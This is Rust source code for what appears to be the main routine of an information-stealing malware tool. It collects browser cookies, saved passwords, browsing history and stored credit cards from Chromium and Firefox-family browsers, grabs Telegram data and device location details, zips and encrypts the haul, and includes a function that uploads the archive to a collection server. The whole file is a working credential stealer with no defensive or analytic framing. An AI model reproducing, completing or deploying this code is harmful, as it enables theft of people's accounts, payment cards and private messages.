use utils::os;
mod apps;
mod utils;
use browser::chromium;
use browser::gecko;
mod browser;
use tokio;
mod toggle;

use std::{
    fs::{self},
    path::PathBuf,
};

use reqwest::{multipart, Body, Client};
use tokio::fs::File;
use tokio_util::codec::{BytesCodec, FramedRead};

#[tokio::main]
async fn main() {
    let mut device = os::Device::new();
    
    // set key at build
    let key = "kUhPuvL3D17eDzvKHhYtcwZnjsjBO3D1jeLI6Sf32NU=";

    device.set_enc_key(key.to_string());

    if crate::toggle::GRAB_NET {
        let network = os::Network::new().await;
        device.set_ip(network.ip());
        device.set_country(network.country());
        device.set_country_code(network.country_code());
    }

    let key: [u8; 32] = base64::decode(key).unwrap().try_into().unwrap();

    // CREATE SAVE LOCATIONS
    let save_location = std::env::temp_dir().join(device.hwid());
    let browser_location = save_location.join("browsers");
    let apps_location = save_location.join("apps");

    utils::funcs::try_create(save_location.clone());
    utils::funcs::try_create(save_location.join("browsers"));
    utils::funcs::try_create(save_location.join("apps"));
    // ----------------

    // GRAB BROWSERS
    for (browser, chromium_cookies) in chromium::get_cookies() {
        fs::write(browser_location.join(format!("[cook]{}.txt", browser)), chromium_cookies.join("\n")).unwrap();
    }

    for (browser, gecko_cookies) in gecko::get_cookies() {
        fs::write(browser_location.join(format!("[cook]{}.txt", browser)), gecko_cookies.join("\n")).unwrap();
    }

    fs::write(save_location.join("info.json"), device.to_json()).unwrap();

    fs::write(browser_location.join("[pass]Chromium.json"), serde_json::to_string(&chromium::get_passwords()).unwrap().as_bytes()).unwrap();
    fs::write(browser_location.join("[hist]Chromium.json"), serde_json::to_string(&chromium::get_history()).unwrap().as_bytes()).unwrap();
    fs::write(browser_location.join("[card]Chromium.json"), serde_json::to_string(&chromium::get_cc()).unwrap().as_bytes()).unwrap();
    // ----------------

    // GRAB APPS
    if crate::toggle::GRAB_TELE {
        utils::funcs::try_create(apps_location.clone());
        let telegram_location = apps_location.join("telegram");
        apps::telegram::grab(telegram_location.clone());
    }
    // ----------------
    
    let file = std::env::temp_dir().join(device.hwid() + ".zip");

    utils::funcs::zip_it(save_location.to_str().unwrap(), file.to_str().unwrap()).unwrap();

    // let mut key = [0u8; 32];
    // rand::thread_rng().fill_bytes(&mut key);
    // let key_b = base64::encode(key);
    // println!("{}", key_b);

    // encryptandupload(&file, device, &mut key).await();

    utils::funcs::encrypt_file(file.as_ref(), &key).await;

    //upload_file(&file.clone(), device).await;

    utils::funcs::decrypt_file(file.as_ref(), &key);

    //     utils::funcs::delete_file(file.to_str().unwrap()).unwrap();
    //     utils::funcs::delete_folder(save_location.to_str().unwrap()).unwrap();
}

async fn upload_file(
    file: &PathBuf,
    device: utils::os::Device,
) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let file = File::open(file.clone()).await?;

    // read file body stream
    let stream = FramedRead::new(file, BytesCodec::new());
    let file_body = Body::wrap_stream(stream);

    //make form part of file
    let some_file = multipart::Part::stream(file_body)
        .file_name(device.get_file_name())
        .mime_str("application/zip")?;

    //create the multipart form
    let form = multipart::Form::new()
        .text("originalname", device.get_file_name())
        .part("file", some_file);

    //send request
    let response = client
        .post("http://localhost:3500/upload")
        .header("X-Bebras", device.to_header())
        .multipart(form)
        .send()
        .await?;
    let result = response.text().await?;
    println!("{:?}", result);
    Ok(())
}
